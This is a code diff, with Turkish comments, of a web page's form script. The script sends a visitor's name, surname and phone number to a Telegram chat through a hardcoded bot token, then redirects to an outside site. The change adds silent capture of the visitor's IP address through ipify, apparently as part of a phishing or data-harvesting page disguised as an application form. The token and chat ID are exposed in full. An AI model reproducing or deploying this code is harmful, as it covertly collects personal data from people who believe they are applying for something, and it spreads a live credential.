@@ -86,25 +86,36 @@
             const lastName = document.getElementById('lastName').value;
             const phone = document.getElementById('phone').value;
 
-            // Telegram bot API URL
-            const token = '7648795693:AAE4pMeYZLDD-XeR0Jg9F0gnZEyuBSwCiBg';
-            const chatId = '-4622909638';
-            const message = `Başvuru Yapıldı:\nAd: ${firstName}\nSoyad: ${lastName}\nTelefon: ${phone}`;
-
-            // Telegram'a veri gönderme
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            // IP adresini almak için ipify API kullanıyoruz
+            fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    if (data.ok) {
-                        // Başvuru başarılı, kullanıcıyı yönlendirme
-                        window.location.href = "https://trjojo.net/";
-                    } else {
-                        alert('Başvuru gönderilemedi. Lütfen tekrar deneyin.');
-                    }
+                    const userIp = data.ip;
+
+                    // Telegram bot API URL
+                    const token = '7648795693:AAE4pMeYZLDD-XeR0Jg9F0gnZEyuBSwCiBg';
+                    const chatId = '-4622909638';
+                    const message = `Başvuru Yapıldı:\nAd: ${firstName}\nSoyad: ${lastName}\nTelefon: ${phone}\nIP Adresi: ${userIp}`;
+
+                    // Telegram'a veri gönderme
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.ok) {
+                                // Başvuru başarılı, kullanıcıyı yönlendirme
+                                window.location.href = "https://trjojo.net/";
+                            } else {
+                                alert('Başvuru gönderilemedi. Lütfen tekrar deneyin.');
+                            }
+                        })
+                        .catch(error => {
+                            alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+                            console.error('Error:', error);
+                        });
                 })
                 .catch(error => {
-                    alert('Bir hata oluştu. Lütfen tekrar deneyin.');
-                    console.error('Error:', error);
+                    alert('IP adresi alınamadı. Lütfen tekrar deneyin.');
+                    console.error('IP fetch error:', error);
                 });
         });
     </script>
